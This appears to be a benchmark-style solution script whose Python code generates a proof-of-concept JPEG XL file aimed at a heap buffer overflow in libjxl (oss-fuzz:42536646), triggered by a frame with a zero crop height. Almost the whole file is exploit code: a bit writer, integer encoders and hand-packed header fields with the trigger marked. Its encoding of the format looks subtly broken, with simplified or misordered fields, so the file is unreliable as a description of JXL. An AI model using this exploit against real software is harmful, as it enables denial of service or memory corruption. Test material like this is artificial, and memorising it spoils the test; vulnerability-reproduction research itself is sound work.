class Solution:
    """
    Generates a Proof-of-Concept (PoC) for a heap buffer overflow in libjxl.
    The vulnerability (oss-fuzz:42536646) is triggered by processing a JXL image
    with a frame that has a cropped width or height of zero. This PoC constructs
    a minimal JXL codestream that defines a 1x1 image, but then includes a frame
    with a crop region of 1x0, which was not properly handled by the vulnerable
    version of the library.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates the PoC input.
        """

        class BitWriter:
            """
            A simple bit writer that packs bits into a bytearray, LSB-first.
            """
            def __init__(self):
                self.data = bytearray()
                self.buffer = 0
                self.bit_count = 0

            def write(self, nbits: int, value: int):
                if nbits == 0:
                    return
                
                value &= (1 << nbits) - 1
                
                self.buffer |= (value << self.bit_count)
                self.bit_count += nbits
                
                while self.bit_count >= 8:
                    self.data.append(self.buffer & 0xFF)
                    self.buffer >>= 8
                    self.bit_count -= 8

            def zero_pad_to_byte(self):
                if self.bit_count > 0:
                    # This implicitly writes zero bits for padding
                    self.data.append(self.buffer)
                    self.buffer = 0
                    self.bit_count = 0

            def get_bytes(self) -> bytes:
                temp_data = self.data.copy()
                if self.bit_count > 0:
                    temp_data.append(self.buffer)
                return bytes(temp_data)

        writer = BitWriter()

        def write_u32(val):
            """
            Encodes an unsigned integer using the JXL U32 variable-length encoding.
            """
            if val == 0:
                writer.write(2, 0b00)
            elif 1 <= val <= 256:
                writer.write(2, 0b01)
                writer.write(8, val - 1)
            elif 257 <= val <= 4352:
                writer.write(2, 0b10)
                writer.write(12, val - 257)
            # Larger values are not needed for this PoC.

        def write_s32(val):
            """
            Encodes a signed integer using a sign bit and U32 for the absolute value.
            """
            sign = 1 if val < 0 else 0
            writer.write(1, sign)
            write_u32(abs(val))

        # --- JXL Codestream Generation ---
        
        # 1. Size Header (for a 1x1 image to pass initial checks)
        write_u32(1 - 1)  # ysize - 1
        writer.write(2, 1)  # ratio = 1:1
        write_u32(1 - 1)  # xsize - 1

        # 2. Image Metadata
        writer.write(1, 1)  # !all_default
        writer.write(1, 0)  # !extra_fields
        writer.write(1, 0)  # bit_depth.floating_point_sample = false
        write_u32(8 - 1)    # bits_per_sample - 1
        write_u32(0)        # exponent_bits_per_sample
        writer.write(2, 0)  # num_extra_channels = 0
        writer.write(1, 1)  # color_encoding.all_default
        writer.write(1, 0)  # no jpeg metadata
        writer.write(6, 0)  # extensions = 0

        # 3. Frame Header
        writer.write(2, 1)   # encoding = Modular
        writer.write(14, 0)  # flags = 0
        write_u32(0)         # duration
        writer.write(1, 0)   # timecode = 0
        write_u32(0)         # name_length
        writer.write(1, 1)   # is_last
        writer.write(1, 1)   # blending_info.all_default
        
        # --- TRIGGER ---
        # Enable cropping and set the cropped height to 0.
        writer.write(1, 1)   # have_crop = true
        write_s32(0)         # crop_x0
        write_s32(0)         # crop_y0
        write_u32(1)         # crop_xsize
        write_u32(0)         # crop_ysize = 0 <-- VULNERABILITY

        # Rest of a minimal frame header
        write_u32(1 - 1)     # passes.num_passes - 1
        writer.write(2, 1)   # lf_level = 1
        
        # modular_frame_header
        writer.write(1, 0)   # do_ycbcr = false
        writer.write(2, 1)   # group_size_shift = 1
        writer.write(1, 1)   # wp_header.all_default

        # Alignment and Table of Contents (TOC)
        writer.zero_pad_to_byte()
        
        writer.write(1, 1)   # toc_is_in_codestream
        writer.write(1, 0)   # permutation is empty
        write_u32(1 - 1)     # num_groups - 1
        write_u32(1 - 1)     # num_lf_groups - 1
        
        # TOC entry for the single group
        write_u32(0)         # size
        write_u32(0)         # lf_size
        
        codestream = writer.get_bytes()
        
        # JXL codestream signature
        jxl_signature = b'\xff\x0a'
        
        return jxl_signature + codestream
